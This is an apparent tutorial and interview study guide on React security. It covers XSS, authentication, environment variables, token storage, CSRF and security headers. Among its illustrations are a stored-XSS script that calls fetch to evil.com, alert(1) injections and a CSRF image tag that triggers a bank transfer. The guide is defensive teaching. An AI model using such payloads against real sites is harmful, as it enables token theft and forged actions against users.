# React Security

> **Goal:** Master React Security completely — understand XSS Prevention, Secure Authentication, Environment Variables, Token Storage, CSRF Basics, real-world attack scenarios, secure coding practices, enterprise security architecture, interview questions, and common security mistakes.

---

# 1. Why Security Matters in React?

Many developers think:

```text
Frontend Is Safe
```

---

Reality:

```text
Frontend Is Public
```

---

Users can:

```text
Inspect Source Code

Modify Requests

Access Browser Storage

Manipulate UI

Intercept Network Calls
```

---

Never trust:

```text
Frontend
```

---

Always assume:

```text
Client Can Be Compromised
```

---

# Common Web Security Threats

```text
XSS

CSRF

Token Theft

Credential Theft

Session Hijacking

API Abuse
```

---

# Security Layers

```text
User
  ↓

Browser
  ↓

React Application
  ↓

API Gateway
  ↓

Backend
  ↓

Database
```

---

Security should exist:

```text
At Every Layer
```

---

# XSS Prevention

---

# 2. What is XSS?

XSS means:

```text
Cross Site Scripting
```

---

Definition:

> An attacker injects malicious JavaScript into a webpage.

---

Goal:

```text
Steal Tokens

Steal Cookies

Redirect Users

Perform Actions As User
```

---

# Example Attack

User enters:

```html
<script>

alert("Hacked")

</script>
```

---

If application renders it directly:

```text
Script Executes
```

---

Dangerous.

---

# Real Example

Comment System

User submits:

```html
<script>

fetch(
 "https://evil.com"
)

</script>
```

---

Another user opens page.

---

Script executes.

---

Attack successful.

---

# Visualization

```text
Attacker
    ↓

Malicious Script
    ↓

Database
    ↓

Victim Browser
    ↓

Script Executes
```

---

# Why React Is Safer

React automatically escapes content.

---

Example:

```jsx
const message =

"<script>alert(1)</script>";
```

---

Render:

```jsx
<p>{message}</p>
```

---

Output:

```html
&lt;script&gt;
alert(1)
&lt;/script&gt;
```

---

Script is displayed as text.

---

Not executed.

---

# Dangerous API

Interview favorite.

---

```jsx
dangerouslySetInnerHTML
```

---

Example:

```jsx
<div

 dangerouslySetInnerHTML={{

  __html: htmlData

 }}

></div>
```

---

This bypasses React protection.

---

# Dangerous Scenario

```javascript
const html =

"<script>
 alert(1)
</script>";
```

---

Rendered using:

```jsx
dangerouslySetInnerHTML
```

---

Script executes.

---

# Secure Approach

Sanitize HTML first.

---

Popular library:

```text
DOMPurify
```

---

Example:

```javascript
const cleanHtml =

DOMPurify.sanitize(
 html
);
```

---

Then render.

---

# XSS Prevention Checklist

✔ Never trust user input

✔ Avoid dangerouslySetInnerHTML

✔ Sanitize HTML

✔ Validate data

✔ Escape content

✔ Use secure HTTP headers

---

# Secure Authentication

---

# 3. What is Authentication?

Authentication means:

```text
Who Are You?
```

---

Examples:

```text
Login

JWT

OAuth

SSO
```

---

# Authentication Flow

```text
User
 ↓

Login Form
 ↓

Backend
 ↓

JWT Token
 ↓

Browser
 ↓

Protected APIs
```

---

# Basic Login Flow

User submits:

```json
{
 "email":"john@test.com",
 "password":"123456"
}
```

---

Backend validates.

---

Returns:

```json
{
 "token":"JWT_TOKEN"
}
```

---

Frontend stores token.

---

Future requests:

```http
Authorization:
Bearer JWT_TOKEN
```

---

# Never Trust Frontend Validation

Wrong:

```javascript
if(password === "admin")
```

---

Frontend code is visible.

---

Always validate:

```text
Backend Side
```

---

# Secure Authentication Principles

✔ HTTPS

✔ Strong Password Policy

✔ Token Expiration

✔ Refresh Tokens

✔ Backend Validation

✔ Role-Based Access

✔ MFA (Multi-Factor Authentication)

---

# Protected Routes

Frontend protection.

---

Example:

```jsx
if(!token){

 return <Navigate
 to="/login"
/>;

}
```

---

Only protects UI.

---

Backend must still validate token.

---

# Environment Variables

---

# 4. What Are Environment Variables?

Environment variables store:

```text
Configuration Values
```

---

Examples:

```text
API URLs

Feature Flags

Analytics IDs
```

---

# Example

```env
VITE_API_URL=
https://api.company.com
```

---

Usage:

```javascript
const apiUrl =

import.meta.env
.VITE_API_URL;
```

---

# Security Mistake

Many beginners store:

```env
DB_PASSWORD=
123456
```

---

Dangerous.

---

Why?

Because React code runs:

```text
In Browser
```

---

Users can inspect it.

---

# Never Store

❌ Database Passwords

❌ API Secrets

❌ Private Keys

❌ Access Keys

---

Frontend environment variables are:

```text
Public
```

---

# Safe Values

✔ API URL

✔ Public Analytics Keys

✔ Public Configurations

✔ Feature Flags

---

# Example

Safe:

```env
VITE_API_URL=
https://api.company.com
```

---

Unsafe:

```env
VITE_SECRET_KEY=
my-super-secret-key
```

---

# Token Storage

---

# 5. What is Token Storage?

After login:

```text
JWT Token
```

must be stored somewhere.

---

Common options:

```text
Local Storage

Session Storage

Cookies

Memory
```

---

# Option 1: Local Storage

Example:

```javascript
localStorage.setItem(

 "token",

 jwtToken

);
```

---

Retrieve:

```javascript
localStorage.getItem(
 "token"
);
```

---

Advantages:

✔ Easy

✔ Persistent

---

Disadvantages:

❌ Vulnerable to XSS

---

If attacker runs JS:

```javascript
localStorage.getItem(
 "token"
);
```

---

Token stolen.

---

# Option 2: Session Storage

Example:

```javascript
sessionStorage.setItem(
 "token",
 token
);
```

---

Advantages:

✔ Removed when tab closes

---

Disadvantages:

❌ Still vulnerable to XSS

---

# Option 3: Cookies

Example:

```http
Set-Cookie:
token=abc123
```

---

Can be:

```text
HttpOnly

Secure

SameSite
```

---

Best practice.

---

# HttpOnly Cookie

Most important interview topic.

---

Cookie:

```http
HttpOnly
```

---

JavaScript cannot read it.

---

Example:

```javascript
document.cookie
```

---

Cannot access:

```text
HttpOnly Cookie
```

---

Helps prevent:

```text
Token Theft
```

---

# Secure Cookie

```http
Secure
```

---

Cookie sent only over:

```text
HTTPS
```

---

# SameSite Cookie

```http
SameSite=Strict
```

---

Helps prevent:

```text
CSRF Attacks
```

---

# Token Storage Comparison

| Storage | Persistent | XSS Risk | Recommended |
|----------|----------|----------|----------|
| LocalStorage | Yes | High | No |
| SessionStorage | Temporary | High | No |
| Cookie | Yes | Lower | Yes |
| HttpOnly Cookie | Yes | Very Low | Best |

---

# Modern Enterprise Recommendation

```text
Access Token
     ↓

Memory

Short Lived
```

---

```text
Refresh Token
     ↓

HttpOnly Cookie
```

---

Most secure approach.

---

# CSRF Basics

---

# 6. What is CSRF?

CSRF means:

```text
Cross Site Request Forgery
```

---

Definition:

> Attacker tricks a logged-in user into performing unwanted actions.

---

# Example

User logged into:

```text
Bank Website
```

---

Attacker sends:

```html
<img
 src=
"https://bank.com
/transfer?amount=10000"
/>
```

---

Browser automatically sends:

```text
Authentication Cookie
```

---

Money transferred.

---

Attack successful.

---

# Visualization

```text
Victim
   ↓

Logged Into Bank
   ↓

Visits Evil Website
   ↓

Request Sent
   ↓

Bank Receives Valid Cookie
   ↓

Action Executed
```

---

# Why CSRF Happens?

Browser automatically sends:

```text
Cookies
```

with requests.

---

Server thinks:

```text
Legitimate User
```

---

Actually:

```text
Attacker Triggered Request
```

---

# CSRF Prevention

---

# SameSite Cookies

Best protection.

---

```http
SameSite=Strict
```

---

Blocks cross-site requests.

---

# CSRF Token

Server generates:

```text
Unique Token
```

---

Frontend sends:

```http
X-CSRF-TOKEN:
abc123
```

---

Server verifies.

---

Only valid frontend can send it.

---

# Example

Request:

```http
POST /transfer
```

---

Headers:

```http
Authorization:
Bearer token

X-CSRF-TOKEN:
abc123
```

---

Server validates.

---

Attack blocked.

---

# Secure Authentication Architecture

---

# 7. Modern Enterprise Flow

```text
User
  ↓

Login
  ↓

Backend
  ↓

Access Token
(Short Lived)
  ↓

Memory

Refresh Token
(HttpOnly Cookie)
  ↓

Backend Validation
```

---

Benefits:

✔ More Secure

✔ Reduced Token Theft

✔ Better Session Management

---

# Security Headers

---

# 8. Important Security Headers

---

## Content Security Policy (CSP)

Controls:

```text
Which Scripts
Can Execute
```

---

Helps prevent:

```text
XSS
```

---

Example:

```http
Content-Security-Policy
```

---

# X-Frame-Options

Prevents:

```text
Clickjacking
```

---

# Strict-Transport-Security

Forces:

```text
HTTPS
```

---

# Real World Security Checklist

---

# Frontend

✔ Input Validation

✔ Escape Content

✔ Avoid dangerous HTML

✔ Secure Routing

✔ Secure API Calls

---

# Authentication

✔ JWT Expiry

✔ Refresh Tokens

✔ Role Validation

✔ MFA

✔ Secure Logout

---

# Storage

✔ Avoid LocalStorage for sensitive tokens

✔ Prefer HttpOnly Cookies

✔ Use HTTPS

---

# APIs

✔ Authorization Checks

✔ Rate Limiting

✔ Backend Validation

---

# Common Security Mistakes

---

# Storing Secrets in React

Wrong:

```env
SECRET_KEY=123456
```

---

Frontend exposes it.

---

# Using Local Storage for Everything

Wrong:

```javascript
localStorage.setItem(
 "token",
 token
);
```

---

XSS risk.

---

# Trusting Frontend Roles

Wrong:

```javascript
if(role==="admin")
```

---

Must verify:

```text
Backend Side
```

---

# Using dangerouslySetInnerHTML

Wrong:

```jsx
dangerouslySetInnerHTML
```

---

Without sanitization.

---

XSS risk.

---

# No HTTPS

Wrong:

```http
http://api.com
```

---

Use:

```https
https://api.com
```

---

# Interview Questions

---

### Q1. What is XSS?

```text
Cross Site Scripting
```

---

Injecting malicious JavaScript.

---

### Q2. How does React help prevent XSS?

```text
Escapes Rendered Content
Automatically
```

---

### Q3. What is dangerouslySetInnerHTML?

```text
Direct HTML Rendering API
```

---

Bypasses React protection.

---

### Q4. What is CSRF?

```text
Cross Site Request Forgery
```

---

### Q5. How do SameSite cookies help?

```text
Prevent Cross-Site Requests
```

---

### Q6. Where should JWTs be stored?

Best:

```text
HttpOnly Cookies
```

---

### Q7. Why avoid Local Storage for tokens?

```text
XSS Vulnerability
```

---

### Q8. Can environment variables hide secrets?

```text
No
```

---

Frontend variables are public.

---

### Q9. What is HttpOnly?

```text
Cookie Not Accessible
By JavaScript
```

---

### Q10. What is CSP?

```text
Content Security Policy
```

---

Helps prevent XSS.

---

# Memory Tricks

### XSS

```text
Inject Script
```

---

### CSRF

```text
Force Request
```

---

### HttpOnly

```text
JavaScript Cannot Read
```

---

### SameSite

```text
Blocks Cross-Site Requests
```

---

### Secure Cookie

```text
HTTPS Only
```

---

### CSP

```text
Control Script Execution
```

---

### Environment Variables

```text
Configuration
NOT Secrets
```

---

# Complete Security Flow

```text
User
   ↓

Login
   ↓

JWT Issued
   ↓

HttpOnly Cookie
   ↓

Protected API
   ↓

CSRF Protection
   ↓

Backend Validation
   ↓

Secure Access
```

---

# Quick Revision

```text
React Security
--------------

XSS
 ↓
 Script Injection

Prevention
 ↓
 Escape Content
 Sanitize HTML

Authentication
 ↓
 JWT
 OAuth
 SSO

Environment Variables
 ↓
 Public Config

Never Store Secrets

Token Storage
 ↓

LocalStorage
 ❌

SessionStorage
 ❌

Cookies
 ✔

HttpOnly Cookies
 ✔✔

CSRF
 ↓
 Forced Requests

Prevention
 ↓
 SameSite Cookies
 CSRF Tokens

Best Practices:

✔ HTTPS

✔ HttpOnly Cookies

✔ Token Expiry

✔ Input Validation

✔ CSP

✔ Backend Authorization

Remember:

XSS
 ↓
 Steal Data

CSRF
 ↓
 Force Action

HttpOnly
 ↓
 Hide Token From JS

SameSite
 ↓
 Block Cross-Site Requests
```

---
